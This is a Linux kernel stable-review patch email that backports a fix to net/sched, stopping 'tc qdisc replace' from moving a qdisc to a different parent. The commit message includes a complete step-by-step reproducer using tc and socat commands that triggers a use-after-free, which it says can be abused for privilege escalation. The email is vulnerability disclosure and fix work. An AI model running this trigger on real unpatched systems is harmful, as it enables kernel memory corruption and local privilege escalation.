Return-Path: <stable+bounces-117737-lists+stable=lfdr.de@vger.kernel.org>
X-Original-To: lists+stable@lfdr.de
Delivered-To: lists+stable@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id 2D2C2A3B829
	for <lists+stable@lfdr.de>; Wed, 19 Feb 2025 10:22:06 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 438AC17E814
	for <lists+stable@lfdr.de>; Wed, 19 Feb 2025 09:14:20 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id EFF341DEFD9;
	Wed, 19 Feb 2025 09:09:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="pVl7wp50"
X-Original-To: stable@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AD39D1DED7D;
	Wed, 19 Feb 2025 09:09:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1739956195; cv=none; b=GBnTvffN+QaC4SefN7TZLMXwYTjJfEu6NF39BkxMkVV0QVdmr6olK/myc0LSf/xN087x4ObytK/KJn3Nk0HRqfXgW/oWp8Db0WORGjrc7n5JUqxqKvYYnhxrFiqyxHEyWmLyG5xF350gOtrWDbVdOnpmxlTMiJV5wIPfZFKW9NQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1739956195; c=relaxed/simple;
	bh=cdNoWhTot7274gt5XaEkbRhSN2/1/ihiuAaOO7/BDlQ=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=D6Peg/fGzL01BDh5Ty5fDyJfTwpXnsaBk4/kR8cWHKWvYjIHzS225O9pBH9kBE5qLvkxGGoyBbwAnW+IhXOBiwhz5X+0jHzdHvqaWKfdWWU3Or3JM6f3fuHfs6Xbw4RTcipGeqSQBSQXIxEH5SyozrIFZ9bct5Wpqyiig79kvDI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=pVl7wp50; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 33D9FC4CEE6;
	Wed, 19 Feb 2025 09:09:55 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1739956195;
	bh=cdNoWhTot7274gt5XaEkbRhSN2/1/ihiuAaOO7/BDlQ=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
	b=pVl7wp50TKTB9TyUxDRWXPw+2fIwBQjkbTQTj53CUq09ZVNpP4Q/CblsN9HHSe4JV
	 vrTO5SMCWo/fuzD2vKg4PDeRdn9ABtwXIH3JkPCAEuVEVHmqxiSK2NshnZsP+kvp2j
	 IChFLW07oIrJsZ4/4kioJAuC8n+9uLR8ysDBc7bI=
From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
To: stable@vger.kernel.org
Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	patches@lists.linux.dev,
	Jamal Hadi Salim <jhs@mojatatu.com>,
	Simon Horman <horms@kernel.org>,
	Jakub Kicinski <kuba@kernel.org>,
	Sasha Levin <sashal@kernel.org>
Subject: [PATCH 6.1 097/578] net: sched: Disallow replacing of child qdisc from one parent to another
Date: Wed, 19 Feb 2025 09:21:41 +0100
Message-ID: <20250219082656.772933763@linuxfoundation.org>
X-Mailer: git-send-email 2.48.1
In-Reply-To: <20250219082652.891560343@linuxfoundation.org>
References: <20250219082652.891560343@linuxfoundation.org>
User-Agent: quilt/0.68
X-stable: review
X-Patchwork-Hint: ignore
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

6.1-stable review patch.  If anyone has any objections, please let me know.

------------------

From: Jamal Hadi Salim <jhs@mojatatu.com>

[ Upstream commit bc50835e83f60f56e9bec2b392fb5544f250fb6f ]

Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".

Joint work with Lion Ackermann <nnamrec@gmail.com>
Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
Reviewed-by: Simon Horman <horms@kernel.org>
Link: https://patch.msgid.link/20250116013713.900000-1-kuba@kernel.org
Signed-off-by: Jakub Kicinski <kuba@kernel.org>
Signed-off-by: Sasha Levin <sashal@kernel.org>
---
 net/sched/sch_api.c | 4 ++++
 1 file changed, 4 insertions(+)

diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
index fe053e717260e..cb379849c51a4 100644
--- a/net/sched/sch_api.c
+++ b/net/sched/sch_api.c
@@ -1638,6 +1638,10 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 				q = qdisc_lookup(dev, tcm->tcm_handle);
 				if (!q)
 					goto create_n_graft;
+				if (q->parent != tcm->tcm_parent) {
+					NL_SET_ERR_MSG(extack, "Cannot move an existing qdisc to a different parent");
+					return -EINVAL;
+				}
 				if (n->nlmsg_flags & NLM_F_EXCL) {
 					NL_SET_ERR_MSG(extack, "Exclusivity flag on, cannot override");
 					return -EEXIST;
-- 
2.39.5




